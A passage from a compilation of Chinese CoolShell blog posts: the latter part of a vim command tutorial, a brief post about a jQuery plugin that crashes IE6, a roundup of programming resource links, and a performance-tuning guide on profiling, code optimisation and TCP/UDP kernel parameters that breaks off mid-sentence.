花点时间熟悉一下上面的命令，一旦你掌握他们了，你就几乎可以干其它编辑器都能干的事了。但是到现在为止，你还是觉得使用vim还是有点笨拙，不过没关系，你可以进阶到第三级了。#### 第三级 – 更好，更强，更快先恭喜你！你干的很不错。我们可以开始一些更为有趣的事了。在第三级，我们只谈那些和vi可以兼容的命令。##### 更好下面，让我们看一下vim是怎么重复自己的：1. `.` → (小数点) 可以重复上一次的命令   2. N<command> → 重复某个命令N次下面是一个示例，找开一个文件你可以试试下面的命令：>   * `2dd` → 删除2行 >   * `3p` → 粘贴文本3次 >   * `100idesu [ESC]` → 会写下 “desu desu desu desu desu desu desu desu desu > desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu > desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu > desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu > desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu > desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu > desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu > desu “ >   * `.` → 重复上一个命令—— 100 “desu “. >   * `3.` → 重复 3 次 “desu” (注意：不是 300，你看，VIM多聪明啊). >
##### 更强你要让你的光标移动更有效率，你一定要了解下面的这些命令， **千万别跳过** 。1. N`G` → 到第 N 行 （陈皓注：注意命令中的G是大写的，另我一般使用 : N 到第N行，如 :137 到第137行）   2. `gg` → 到第一行。（陈皓注：相当于1G，或 :1）   3. `G` → 到最后一行。   4. 按单词移动：>     1. `w` → 到下一个单词的开头。 >     2. `e` → 到下一个单词的结尾。 > > > 如果你认为单词是由默认方式，那么就用小写的e和w。默认上来说，一个单词由字母，数字和下划线组成（陈皓注：程序变量） > > > 如果你认为单词是由blank字符分隔符，那么你需要使用大写的E和W。（陈皓注：程序语句） > > !Word moves example下面，让我来说说最强的光标移动：>   * `%` : 匹配括号移动，包括 `(`, `{`, ``. （陈皓注：你需要把光标先移到括号上） >   * `*` 和 `#`: 匹配光标当前所在的单词，移动光标到下一个（或上一个）匹配单词（*是下一个，#是上一个） >相信我，上面这三个命令对程序员来说是相当强大的。
##### 更快你一定要记住光标的移动，因为很多命令都可以和这些移动光标的命令连动。很多命令都可以如下来干：`<start position><command><end position>`例如 `0y$` 命令意味着：* `0` → 先到行头   * `y` → 从这里开始拷贝   * `$` → 拷贝到本行最后一个字符你可可以输入 `ye`，从当前位置拷贝到本单词的最后一个字符。你也可以输入 `y2/foo` 来拷贝2个 “foo” 之间的字符串。还有很多时间并不一定你就一定要按y才会拷贝，下面的命令也会被拷贝：* `d` (删除 )   * `v` (可视化的选择)   * `gU` (变大写)   * `gu` (变小写)   * 等等（陈皓注：可视化选择是一个很有意思的命令，你可以先按v，然后移动光标，你就会看到文本被选择，然后，你可能d，也可y，也可以变大写等）#### 第四级 – Vim 超能力你只需要掌握前面的命令，你就可以很舒服的使用VIM了。但是，现在，我们向你介绍的是VIM杀手级的功能。下面这些功能是我只用vim的原因。##### 在当前行上移动光标: `0` `^` `$` `f` `F` `t` `T` `,` `;`
>   * `0` → 到行头 >   * `^` → 到本行的第一个非blank字符 >   * `$` → 到行尾 >   * `g_` → 到本行最后一个不是blank字符的位置。 >   * `fa` → 到下一个为a的字符处，你也可以fs到下一个为s的字符。 >   * `t,` → 到逗号前的第一个字符。逗号可以变成其它字符。 >   * `3fa` → 在当前行查找第三个出现的a。 >   * `F` 和 `T` → 和 `f` 和 `t` 一样，只不过是相反方向。   >  ![Line moves >还有一个很有用的命令是 `dt"` → 删除所有的内容，直到遇到双引号—— `"。`##### 区域选择 `<action>a<object>` 或 `<action>i<object>`在visual 模式下，这些命令很强大，其命令格式为`<action>a<object>` 和 `<action>i<object>`* action可以是任何的命令，如 `d` (删除), `y` (拷贝), `v` (可以视模式选择)。   * object 可能是： `w` 一个单词， `W` 一个以空格为分隔的单词， `s` 一个句字， `p` 一个段落。也可以是一个特别的字符：`"、` `'、` `)、` `}、` `]。`
假设你有一个字符串 `(map (+) ("foo"))`.而光标键在第一个 `o `的位置。>   * `vi"` → 会选择 `foo`. >   * `va"` → 会选择 `"foo"`. >   * `vi)` → 会选择 `"foo"`. >   * `va)` → 会选择`("foo")`. >   * `v2i)` → 会选择 `map (+) ("foo")` >   * `v2a)` → 会选择 `(map (+) ("foo"))` >!Text objects selection##### 块操作: `<C-v>`块操作，典型的操作： `0 <C-v> <C-d> I-- [ESC]`* `^` → 到行头   * `<C-v>` → 开始块操作   * `<C-d>` → 向下移动 (你也可以使用hjkl来移动光标，或是使用%，或是别的)   * `I-- [ESC]` → I是插入，插入“`--`”，按ESC键来为每一行生效。!Rectangular blocks在Windows下的vim，你需要使用 `<C-q>` 而不是 `<C-v>` ，`<C-v>` 是拷贝剪贴板。
##### 自动提示： `<C-n>` 和 `<C-p>`在 Insert 模式下，你可以输入一个词的开头，然后按 `<C-p>或是<C-n>，自动补齐功能就出现了……```!Completion##### 宏录制： `qa` 操作序列 `q`, `@a`, `@@`* `qa` 把你的操作记录在寄存器 `a。`   * 于是 `@a` 会replay被录制的宏。   * `@@` 是一个快捷键用来replay最新录制的宏。> **_示例_** > > 在一个只有一行且这一行只有“1”的文本中，键入如下命令： > >   * `qaYp<C-a>q`→ >     * `qa` 开始录制 >     * `Yp` 复制行. >     * `<C-a>` 增加1. >     * `q` 停止录制. >   * `@a` → 在1下面写下 2 >   * `@@` → 在2 正面写下3 >   * 现在做 `100@@` 会创建新的100行，并把数据增加到 103. >!Macros##### 可视化选择： `v`,`V`,`<C-v>`前面，我们看到了 `<C-v>`的示例 （在Windows下应该是<C-q>），我们可以使用 `v` 和 `V`。一但被选好了，你可以做下面的事：
* `J` → 把所有的行连接起来（变成一行）   * `<` 或 `>` → 左右缩进   * `=` → 自动给缩进 （陈皓注：这个功能相当强大，我太喜欢了）!Autoindent在所有被选择的行后加上点东西：* `<C-v>`   * 选中相关的行 (可使用 `j` 或 `<C-d>` 或是 `/pattern` 或是 `%` 等……)   * `$` 到行最后   * `A`, 输入字符串，按 `ESC。`!Append to many lines##### 分屏: `:split` 和 `vsplit`.下面是主要的命令，你可以使用VIM的帮助 `:help split`. 你可以参考本站以前的一篇文章VIM分屏。>   * `:split` → 创建分屏 (`:vsplit`创建垂直分屏) >   * `<C-w><dir>` : dir就是方向，可以是 `hjkl` 或是 ←↓↑→ 中的一个，其用来切换分屏。 >   * `<C-w>_` (或 `<C-w>|`) : 最大化尺寸 (<C-w>| 垂直分屏) >   * `<C-w>+` (或 `<C-w>-`) : 增加尺寸 >
!Split#### 结束语* 上面是作者最常用的90%的命令。   * 我建议你每天都学1到2个新的命令。   * 在两到三周后，你会感到vim的强大的。* 有时候，学习VIM就像是在死背一些东西。   * 幸运的是，vim有很多很不错的工具和优秀的文档。   * 运行vimtutor直到你熟悉了那些基本命令。   * 其在线帮助文档中你应该要仔细阅读的是 `:help usr_02.txt`.   * 你会学习到诸如 `!，` 目录，寄存器，插件等很多其它的功能。学习vim就像学弹钢琴一样，一旦学会，受益无穷。——————————正文结束——————————对于vi/vim只是点评一点：这是一个你不需要使用鼠标，不需使用小键盘，只需要使用大键盘就可以完成很多复杂功能文本编辑的编辑器。不然，Visual Studio也不就会有vim的插件了。(全文完)# 一个jQuery的插件作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnjQuery这个强大的玩意我就不多说了，不知道可以上网搜搜看。IE6我也不多说了，这可能是史上骂名最多的一个浏览器，网上有N多的声讨IE6的文章，你也可以参看本站的《9个最常见IE的Bug及其fix》和《IE的CSS相关的BUG》，如果你今天还在用IE6，或是IE类浏览器，那请让我小小的BS你一下。
这个jQuery的Plugin可能是有史以来所有plugin中最有个性的一个，因为这个plugin什么也不干，其会用户的IE6版的浏览器直接Crash掉。这个plugin叫jQuery Crash，其网页链接在下面，是一个四星级的插件，仅仅435个字节。其是这样介绍自己的，有脏话，我就不翻译了。> A jQuery plugin for crashing IE6. That’ll teach those motherf!%@*#s to > upgrade their s#*t.其它，让IE系例的浏览器挂掉，并不需要Javascript，你可以尝试点击下面这个页面，这是一个纯HTML的页面，没有任何的CSS，或是JS的东西，只有HTML。请小心打开（如果在Firefox中打开也可能会挂，Chrome中没事）这个纯HTML的来源是本来是作者写了一个程序生成了一个N层嵌套的表格，结果在IE5中导致了IE5不响应直到Crash并使用了100%的CPU资源，这么多年过去了，还是老样子，在我的dual- core+IE7上，也是一样，占了50%的CPU，而且还有很高的内核使用，最后只能把进程给kill了。BT啊，纯HTML都会让IE这样。
# 一些文章资源和趣闻作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面是我这段时间来收集的一些有意思的东西。本站这样的文章还很多，如这个，这个，这个。Javascript Garden，这是学习Javascript最好的网站了。http://bonsaiden.github.com/JavaScript- Garden，这个文档由两具StackOverflow的人写成, Ivo Wetzel(Writing) 和 Zhang Yi Jiang (Design)，表示敬意。想看看Web开发有哪些技术吗？你得看看这个网站：，他对目前几乎所有Web上用得到的技术都分了个类。下面是个抓图。Mozilla的安全编程规范  Downloads associated to Software developmentPHP,Perl, Ruby, Python语法比较图形游戏编程的电子书图形编程黑皮书：Black Art of 3D Game Programming: Writing Your Own High-Speed 3D Polygon Video Games in C
想学设计模式吗？这是一个非常好的网站： 以元素周期表的形式把23个经典模式列出来，让我想到了这几天在看的美剧Breaking Bad，呵呵。Learn C the Hard WayLearn Ruby the Hard WayLearn Python the Hard WayLearn SQL the Hard WayLinux基础学习：* Linux Fundamentals, Part 1   * Linux Fundamentals, Part 2   * Linux Fundamentals, Part 3   * Linux Fundamentals, Part 4相了解GIF吗？这里有篇不错的文章：如何在PC上通过VirtualBox装一个Android操作系统。不过这篇文章有点老了，是去年的，最新的方式是使用Android-x86这个项目。一些你可能不知道的git的tips：一个给C/C++程序员用的Vim Plugin，我试用了一下，不是很好用。不过也许你会喜欢：数独游戏的程序算法，140个字节的一段javascript程序：一个教你用HTML5做一个画图版的教程： 其示例在这里
这里又是一个HTML5的演示 ，一个物理的会粘在浏览器边框上的小方块，在iPad里演示相当有意思。只是其代码好像被搞得非常地不易读，不过，你可以试试这个工具来整理代码：，但是变量命名还是会让你毫无头绪。HTML5的一个很炫的示例： 你可以用鼠标巡航，点左键加速（另，那位朋友知道其背景音乐？）想用HTML5做股票图吗？看看这个库：一个7K的js，可以让你的HTML的列表很灵活的分类，排序，搜索，过滤：一个OOP的PHP处理图片的类库：http://imagine.readthedocs.org一个Javascript实现的H.264解码器。 （演示地址 – 请用firefox打开，download速度可能很慢）不过，其是用Android C实现的，然后把C转成Javascript的代码。如果你想知道如何把C代码转成Javascript，你可以看看这个项目： – LLVM-to-JavaScript compiler。（变态！）一个可以画流程图的Javascript lib – WireIt：http://neyric.github.com/wireit/这是一个网站，仅用CSS，没有JS，没有图片做的N多公司的logo。但其可以用纯CSS做个动画，你可以看看： 研究了一下发现其用到了 -webkit-animation。
一个用bash处理JSON的脚本：微软VS中的Debug Canvas,相当的不错啊。，可惜只在 Visual Studio Ultimate里。介绍一下很有意思的Firefox插件 Titl 3D，其项目主页在 。这个插件使用WebGL可以3D地显示网页，安装好插件后，简单地按一下Ctrl+Shift+M就可以了。下面我用其显示了新浪微博和WebQQ。目前的功能不是很多，但是这个插件简直是太cool了——可以大胆的设想一下以后会不会有3D的网页。最后，在网上看到一个笑话，如下：这是给程序员们女朋友的建议。如果某程序员要和你分手，你可以参照这位国外程序员女友的作法——“你可以在facebook和twitter上拉黑我，也可以不回我的短信，但是，你永远不可能阻止我对你在Reddit上发的所有的贴投反对票！FUCK YOU ！”就这些，希望对你会喜欢。# 性能调优攻略作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn关于性能优化这是一个比较大的话题，在《由12306.cn谈谈网站性能技术》中我从业务和设计上说过一些可用的技术以及那些技术的优缺点，今天，想从一些技术细节上谈谈性能优化，主要是一些代码级别的技术和方法。 **本文的东西是我的一些经验和知识，并不一定全对，希望大家指正和补充** 。
在开始这篇文章之前，大家可以移步去看一下酷壳以前发表的《代码优化概要》，这篇文章基本上告诉你—— **要进行优化，先得找到性能瓶颈** ！ 但是在讲如何定位系统性能瓶劲之前，请让我讲一下系统性能的定义和测试，因为没有这两件事，后面的定位和优化无从谈起。目录* 一、系统性能定义   * 二、系统性能测试   * 三、定位性能瓶颈     * 3.1）查看操作系统负载     * 3.2）使用Profiler测试   * 四、常见的系统瓶颈#### 一、系统性能定义让我们先来说说如何什么是系统性能。这个定义非常关键，如果我们不清楚什么是系统性能，那么我们将无法定位之。我见过很多朋友会觉得这很容易，但是仔细一问，其实他们并没有一个比较系统的方法，所以，在这里我想告诉大家如何系统地来定位性能。 总体来说，系统性能就是两个事：1. **Throughput** ，吞吐量。也就是每秒钟可以处理的请求数，任务数。   2. **Latency** ， 系统延迟。也就是系统在处理一个请求或一个任务时的延迟。一般来说，一个系统的性能受到这两个条件的约束，缺一不可。比如，我的系统可以顶得住一百万的并发，但是系统的延迟是2分钟以上，那么，这个一百万的负载毫无意义。系统延迟很短，但是吞吐量很低，同样没有意义。所以，一个好的系统的性能测试必然受到这两个条件的同时作用。 有经验的朋友一定知道，这两个东西的一些关系：
* **Throughput越大，Latency会越差。** 因为请求量过大，系统太繁忙，所以响应速度自然会低。   * **Latency越好，能支持的Throughput就会越高。** 因为Latency短说明处理速度快，于是就可以处理更多的请求。#### 二、系统性能测试经过上述的说明，我们知道要测试系统的性能，需要我们收集系统的Throughput和Latency这两个值。* 首先， **需要定义Latency这个值** ，比如说，对于网站系统响应时间必需是5秒以内（对于某些实时系统可能需要定义的更短，比如5ms以内，这个更根据不同的业务来定义）* 其次， **开发性能测试工具** ，一个工具用来制造高强度的Throughput，另一个工具用来测量Latency。对于第一个工具，你可以参考一下“十个免费的Web压力测试工具”，关于如何测量Latency，你可以在代码中测量，但是这样会影响程序的执行，而且只能测试到程序内部的Latency，真正的Latency是整个系统都算上，包括操作系统和网络的延时，你可以使用Wireshark来抓网络包来测量。这两个工具具体怎么做，这个还请大家自己思考去了。
* 最后， **开始性能测试** 。你需要不断地提升测试的Throughput，然后观察系统的负载情况，如果系统顶得住，那就观察Latency的值。这样，你就可以找到系统的最大负载，并且你可以知道系统的响应延时是多少。再多说一些，* 关于Latency，如果吞吐量很少，这个值估计会非常稳定，当吞吐量越来越大时，系统的Latency会出现非常剧烈的抖动，所以，我们在测量Latency的时候，我们需要注意到Latency的分布，也就是说，有百分之几的在我们允许的范围，有百分之几的超出了，有百分之几的完全不可接受。也许，平均下来的Latency达标了，但是其中仅有50%的达到了我们可接受的范围。那也没有意义。* 关于性能测试，我们还需要定义一个时间段。比如：在某个吞吐量上持续15分钟。因为当负载到达的时候，系统会变得不稳定，当过了一两分钟后，系统才会稳定。另外，也有可能是，你的系统在这个负载下前几分钟还表现正常，然后就不稳定了，甚至垮了。所以，需要这么一段时间。这个值，我们叫做峰值极限。* 性能测试还需要做Soak Test，也就是在某个吞吐量下，系统可以持续跑一周甚至更长。这个值，我们叫做系统的正常运行的负载极限。
性能测试有很多很复要的东西，比如：burst test等。 这里不能一一详述，这里只说了一些和性能调优相关的东西。总之，性能测试是一细活和累活。#### 三、定位性能瓶颈有了上面的铺垫，我们就可以测试到到系统的性能了，再调优之前，我们先来说说如何找到性能的瓶颈。我见过很多朋友会觉得这很容易，但是仔细一问，其实他们并没有一个比较系统的方法。##### 3.1）查看操作系统负载首先，当我们系统有问题的时候，我们不要急于去调查我们代码，这个毫无意义。我们首要需要看的是操作系统的报告。看看操作系统的CPU利用率，看看内存使用率，看看操作系统的IO，还有网络的IO，网络链接数，等等。Windows下的perfmon是一个很不错的工具，Linux下也有很多相关的命令和工具，比如：SystemTap，LatencyTOP，vmstat, sar, iostat, top, tcpdump等等 。通过观察这些数据，我们就可以知道我们的软件的性能基本上出在哪里。比如：1）先看CPU利用率，如果CPU利用率不高，但是系统的Throughput和Latency上不去了，这说明我们的程序并没有忙于计算，而是忙于别的一些事，比如IO。（另外，CPU的利用率还要看内核态的和用户态的，内核态的一上去了，整个系统的性能就下来了。而对于多核CPU来说，CPU 0 是相当关键的，如果CPU 0的负载高，那么会影响其它核的性能，因为CPU各核间是需要有调度的，这靠CPU0完成）
2）然后，我们可以看一下IO大不大，IO和CPU一般是反着来的，CPU利用率高则IO不大，IO大则CPU就小。关于IO，我们要看三个事，一个是磁盘文件IO，一个是驱动程序的IO（如：网卡），一个是内存换页率。这三个事都会影响系统性能。3）然后，查看一下网络带宽使用情况，在Linux下，你可以使用iftop, iptraf, ntop, tcpdump这些命令来查看。或是用Wireshark来查看。4）如果CPU不高，IO不高，内存使用不高，网络带宽使用不高。但是系统的性能上不去。这说明你的程序有问题，比如，你的程序被阻塞了。可能是因为等那个锁，可能是因为等某个资源，或者是在切换上下文。**通过了解操作系统的性能，我们才知道性能的问题，比如：带宽不够，内存不够，TCP缓冲区不够，等等，很多时候，不需要调整程序的，只需要调整一下硬件或操作系统的配置就可以了** 。##### 3.2）使用Profiler测试接下来，我们需要使用性能检测工具，也就是使用某个Profiler来差看一下我们程序的运行性能。如：Java的JProfiler/TPTP/CodePro Profiler，GNU的gprof，IBM的PurifyPlus，Intel的VTune，AMD的CodeAnalyst，还有Linux下的OProfile/perf，后面两个可以让你对你的代码优化到CPU的微指令级别，如果你关心CPU的L1/L2的缓存调优，那么你需要考虑一下使用VTune。 使用这些Profiler工具，可以让你程序中各个模块函数甚至指令的很多东西，如： **运行的时间** ， **调用的次数** ， **CPU的利用率** ，等等。这些东西对我们来说非常有用。
我们重点观察运行时间最多，调用次数最多的那些函数和指令。这里注意一下，对于调用次数多但是时间很短的函数，你可能只需要轻微优化一下，你的性能就上去了（比如：某函数一秒种被调用100万次，你想想如果你让这个函数提高0.01毫秒的时间 ，这会给你带来多大的性能）使用Profiler有个问题我们需要注意一下，因为Profiler会让你的程序运行的性能变低，像PurifyPlus这样的工具会在你的代码中插入很多代码，会导致你的程序运行效率变低，从而没发测试出在高吞吐量下的系统的性能，对此，一般有两个方法来定位系统瓶颈：1）在你的代码中自己做统计，使用微秒级的计时器和函数调用计算器，每隔10秒把统计log到文件中。2）分段注释你的代码块，让一些函数空转，做Hard Code的Mock，然后再测试一下系统的Throughput和Latency是否有质的变化，如果有，那么被注释的函数就是性能瓶颈，再在这个函数体内注释代码，直到找到最耗性能的语句。最后再说一点， **对于性能测试，不同的Throughput会出现不同的测试结果，不同的测试数据也会有不同的测试结果。所以，用于性能测试的数据非常重要，性能测试中，我们需要观测试不同Throughput的结果** 。
#### 四、常见的系统瓶颈下面这些东西是我所经历过的一些问题，也许并不全，也许并不对，大家可以补充指正，我 **纯属抛砖引玉** 。关于系统架构方面的性能调优，大家可移步看一下《由12306.cn谈谈网站性能技术》，关于Web方面的一些性能调优的东西，大家可以看看《Web开发中需要了解的东西》一文中的性能一章。我在这里就不再说设计和架构上的东西了。****一般来说，性能优化也就是下面的几个策略：* **用空间换时间** 。各种cache如CPU L1/L2/RAM到硬盘，都是用空间来换时间的策略。这样策略基本上是把计算的过程一步一步的保存或缓存下来，这样就不用每次用的时候都要再计算一遍，比如数据缓冲，CDN，等。这样的策略还表现为冗余数据，比如数据镜象，负载均衡什么的。* **用时间换空间** 。有时候，少量的空间可能性能会更好，比如网络传输，如果有一些压缩数据的算法（如前些天说的“Huffman 编码压缩算法” 和 “rsync 的核心算法”），这样的算法其实很耗时，但是因为瓶颈在网络传输，所以用时间来换空间反而能省时间。* **简化代码** 。最高效的程序就是不执行任何代码的程序，所以，代码越少性能就越高。关于代码级优化的技术大学里的教科书有很多示例了。如：减少循环的层数，减少递归，在循环中少声明变量，少做分配和释放内存的操作，尽量把循环体内的表达式抽到循环外，条件表达的中的多个条件判断的次序，尽量在程序启动时把一些东西准备好，注意函数调用的开销（栈上开销），注意面向对象语言中临时对象的开销，小心使用异常（不要用异常来检查一些可接受可忽略并经常发生的错误），…… 等等，等等，这连东西需要我们非常了解编程语言和常用的库。
* **并行处理** 。如果CPU只有一个核，你要玩多进程，多线程，对于计算密集型的软件会反而更慢（因为操作系统调度和切换开销很大），CPU的核多了才能真正体现出多进程多线程的优势。并行处理需要我们的程序有Scalability，不能水平或垂直扩展的程序无法进行并行处理。从架构上来说，这表再为——是否可以做到不改代码只是加加机器就可以完成性能提升？总之， **根据2：8原则来说，20%的代码耗了你80%的性能，找到那20%的代码，你就可以优化那80%的性能** 。 下面的一些东西都是我的一些经验，我只例举了一些最有价值的性能调优的的方法，供你参考，也欢迎补充。**4.1）算法调优** 。算法非常重要，好的算法会有更好的性能。举几个我经历过的项目的例子，大家可以感觉一下。* 一个是 **过滤算法** ，系统需要对收到的请求做过滤，我们把可以被filter in/out的东西配置在了一个文件中，原有的过滤算法是遍历过滤配置，后来，我们找到了一种方法可以对这个过滤配置进行排序，这样就可以用二分折半的方法来过滤，系统性能增加了50%。* 一个是 **哈希算法** 。计算哈希算法的函数并不高效，一方面是计算太费时，另一方面是碰撞太高，碰撞高了就跟单向链表一个性能（可参看Hash Collision DoS 问题）。我们知道，算法都是和需要处理的数据很有关系的，就算是被大家所嘲笑的“冒泡排序”在某些情况下（大多数数据是排好序的）其效率会高于所有的排序算法。哈希算法也一样，广为人知的哈希算法都是用英文字典做测试，但是我们的业务在数据有其特殊性，所以，对于还需要根据自己的数据来挑选适合的哈希算法。对于我以前的一个项目，公司内某牛人给我发来了一个哈希算法，结果让我们的系统性能上升了150%。（关于各种哈希算法，你一定要看看StackExchange上的这篇关于各种hash算法的文章 ）
* **分而治之和预处理** 。以前有一个程序为了生成月报表，每次都需要计算很长的时间，有时候需要花将近一整天的时间。于是我们把我们找到了一种方法可以把这个算法发成增量式的，也就是说我每天都把当天的数据计算好了后和前一天的报表合并，这样可以大大的节省计算时间，每天的数据计算量只需要20分钟，但是如果我要算整个月的，系统则需要10个小时以上（SQL语句在大数据量面前性能成级数性下降）。这种分而治之的思路在大数据面前对性能有很帮助，就像merge排序一样。SQL语句和数据库的性能优化也是这一策略，如：使用嵌套式的Select而不是笛卡尔积的Select，使用视图，等等。**4.2）代码调优** 。从我的经验上来说，代码上的调优有下面这几点：* **字符串操作** 。这是最费系统性能的事了，无论是strcpy, strcat还是strlen，最需要注意的是字符串子串匹配。所以，能用整型最好用整型。举几个例子，第一个例子是N年前做银行的时候，我的同事喜欢把日期存成字符串（如：2012-05-29 08:30:02），我勒个去，一个select where between语句相当耗时。另一个例子是，我以前有个同事把一些状态码用字符串来处理，他的理由是，这样可以在界面上直接显示，后来性能调优的时候，我把这些状态码全改成整型，然后用位操作查状态，因为有一个每秒钟被调用了150K次的函数里面有三处需要检查状态，经过改善以后，整个系统的性能上升了30%左右。还有一个例子是，我以前从事的某个产品编程规范中有一条是要在每个函数中把函数名定义出来，如：const char fname[]=”functionName()”, 这是为了好打日志，但是为什么不声明成 static类型的呢？
* **多线程调优** 。有人说，thread is evil，这个对于系统性能在某些时候是个问题。因为多线程瓶颈就在于互斥和同步的锁上，以及线程上下文切换的成本，怎么样的少用锁或不用锁是根本（比如：多版本并发控制(MVCC)在分布式系统中的应用在分布式系统中的应用") 中说的乐观锁可以解决性能问题），此外，还有读写锁也可以解决大多数是读操作的并发的性能问题。这里多说一点在C++中，我们可能会使用线程安全的智能指针AutoPtr或是别的一些容器，只要是线程安全的，其不管三七二十一都要上锁，上锁是个成本很高的操作，使用AutoPtr会让我们的系统性能下降得很快，如果你可以保证不会有线程并发问题，那么你应该不要用AutoPtr。我记得我上次我们同事去掉智能指针的引用计数，让系统性能提升了50%以上。对于Java对象的引用计数，如果我猜的没错的话，到处都是锁，所以，Java的性能问题一直是个问题。另外，线程不是越多越好，线程间的调度和上下文切换也是很夸张的事，尽可能的在一个线程里干，尽可能的不要同步线程。这会让你有很多的性能。* **内存分配** 。不要小看程序的内存分配。malloc/realloc/calloc这样的系统调非常耗时，尤其是当内存出现碎片的时候。我以前的公司出过这样一个问题——在用户的站点上，我们的程序有一天不响应了，用GDB跟进去一看，系统hang在了malloc操作上，20秒都没有返回，重启一些系统就好了。这就是内存碎片的问题。这就是为什么很多人抱怨STL有严重的内存碎片的问题，因为太多的小内存的分配释放了。有很多人会以为用内存池可以解决这个问题，但是实际上他们只是重新发明了Runtime-C或操作系统的内存管理机制，完全于事无补。当然解决内存碎片的问题还是通过内存池，具体来说是一系列不同尺寸的内存池（这个留给大家自己去思考）。当然，少进行动态内存分配是最好的。说到内存池就需要说一下池化技术。比如线程池，连接池等。池化技术对于一些短作业来说（如http服务） 相当相当的有效。这项技术可以减少链接建立，线程创建的开销，从而提高性能。
* **异步操作** 。我们知道Unix下的文件操作是有block和non-block的方式的，像有些系统调用也是block式的，如：Socket下的select，Windows下的WaitforObject之类的，如果我们的程序是同步操作，那么会非常影响性能，我们可以改成异步的，但是改成异步的方式会让你的程序变复杂。异步方式一般要通过队列，要注间队列的性能问题，另外，异步下的状态通知通常是个问题，比如消息事件通知方式，有callback方式，等，这些方式同样可能会影响你的性能。但是通常来说，异步操作会让性能的吞吐率有很大提升（Throughput），但是会牺牲系统的响应时间（latency）。这需要业务上支持。* **语言和代码库** 。我们要熟悉语言以及所使用的函数库或类库的性能。比如：STL中的很多容器分配了内存后，那怕你删除元素，内存也不会回收，其会造成内存泄露的假像，并可能造成内存碎片问题。再如，STL某些容器的size()==0 和 empty()是不一样的，因为，size()是O(n)复杂度，empty()是O(1)的复杂度，这个要小心。Java中的JVM调优需要使用的这些参数：-Xms -Xmx -Xmn -XX:SurvivorRatio -XX:MaxTenuringThreshold，还需要注意JVM的GC，GC的霸气大家都知道，尤其是full GC（还整理内存碎片），他就像“恐龙特级克赛号”一样，他运行的时候，整个世界的时间都停止了。
**4.3）网络调优**关于网络调优，尤其是TCP Tuning（你可以以这两个关键词在网上找到很多文章），这里面有很多很多东西可以说。看看Linux下TCP/IP的那么多参数就知道了（顺便说一下，你也许不喜欢Linux，但是你不能否认Linux给我们了很多可以进行内核调优的权力）。强烈建议大家看看《TCP/IP 详解 卷1:协议》这本书。我在这里只讲一些概念上的东西。**A） TCP调优**我们知道TCP链接是有很多开销的，一个是会占用文件描述符，另一个是会开缓存，一般来说一个系统可以支持的TCP链接数是有限的，我们需要清楚地认识到TCP链接对系统的开销是很大的。正是因为TCP是耗资源的，所以，很多攻击都是让你系统上出现大量的TCP链接，把你的系统资源耗尽。比如著名的SYNC Flood攻击。所以，我们要注意配置KeepAlive参数，这个参数的意思是定义一个时间，如果链接上没有数据传输，系统会在这个时间发一个包，如果没有收到回应，那么TCP就认为链接断了，然后就会把链接关闭，这样可以回收系统资源开销。（注：HTTP层上也有KeepAlive参数）对于像HTTP这样的短链接，设置一个1-2分钟的keepalive非常重要。这可以在一定程度上防止DoS攻击。有下面几个参数（下面这些参数的值仅供参考）：
net.ipv4.tcp_keepalive_probes = 5     net.ipv4.tcp_keepalive_intvl = 20     net.ipv4.tcp_fin_timeout = 30对于TCP的TIME_WAIT这个状态，主动关闭的一方进入TIME_WAIT状态，TIME_WAIT状态将持续2个MSL(Max Segment Lifetime)，默认为4分钟，TIME_WAIT状态下的资源不能回收。有大量的TIME_WAIT链接的情况一般是在HTTP服务器上。对此，有两个参数需要注意，net.ipv4.tcp_tw_reuse=1     net.ipv4.tcp_tw_recycle=1前者表示重用TIME_WAIT，后者表示回收TIME_WAIT的资源。TCP还有一个重要的概念叫RWIN（TCP Receive Window Size），这个东西的意思是，我一个TCP链接在没有向Sender发出ack时可以接收到的最大的数据包。为什么这个很重要？因为如果Sender没有收到Receiver发过来ack，Sender就会停止发送数据并会等一段时间，如果超时，那么就会重传。这就是为什么TCP链接是可靠链接的原因。重传还不是最严重的，如果有丢包发生的话，TCP的带宽使用率会马上受到影响（会盲目减半），再丢包，再减半，然后如果不丢包了，就逐步恢复。相关参数如下：
net.core.wmem_default = 8388608     net.core.rmem_default = 8388608     net.core.rmem_max = 16777216     net.core.wmem_max = 16777216一般来说，理论上的RWIN应该设置成：吞吐量 * 回路时间。Sender端的buffer应该和RWIN有一样的大小，因为Sender端发送完数据后要等Receiver端确认，如果网络延时很大，buffer过小了，确认的次数就会多，于是性能就不高，对网络的利用率也就不高了。也就是说，对于延迟大的网络，我们需要大的buffer，这样可以少一点ack，多一些数据，对于响应快一点的网络，可以少一些buffer。因为，如果有丢包（没有收到ack），buffer过大可能会有问题，因为这会让TCP重传所有的数据，反而影响网络性能。（当然，网络差的情况下，就别玩什么高性能了） 所以，高性能的网络重要的是要让网络丢包率非常非常地小（基本上是用在LAN里），如果网络基本是可信的，这样用大一点的buffer会有更好的网络传输性能（来来回回太多太影响性能了）。
另外，我们想一想，如果网络质量非常好，基本不丢包，而业务上我们不怕偶尔丢几个包，如果是这样的话，那么，我们为什么不用速度更快的UDP呢？你想过这个问题了吗？**B）UDP调优**说到UDP的调优，有一些事我想重点说一样，那就是MTU——最大传输单元（其实这对TCP也一样，因为这是链路层上的东西）。所谓最大传输单元，你可以想像成是公路上的公交车，假设一个公交车可以最多坐70人，带宽就像是公路的车道数一样，如果一条路上最多可以容下100辆公交车，那意味着我最多可以运送7000人，但是如果公交车坐不满，比如平均每辆车只有20人，那么我只运送了2000人，于是我公路资源（带宽资源）就被浪费了。 所以，我们对于一个UDP的包，我们要尽量地让他大到MTU的最大尺寸再往网络上传，这样可以最大化带宽利用率。对于这个MTU，以太网是1500字节，光纤是4352字节，802.11无线网是7981。但是，当我们用TCP/UDP发包的时候，我们的有效负载Payload要低于这个值，因为IP协议会加上20个字节，UDP会加上8个字节（TCP加的更多），所以，一般来说，你的一个UDP包的最大应该是1500-8-20=1472，这是你的数据的大小。当然，如果你用光纤的话， 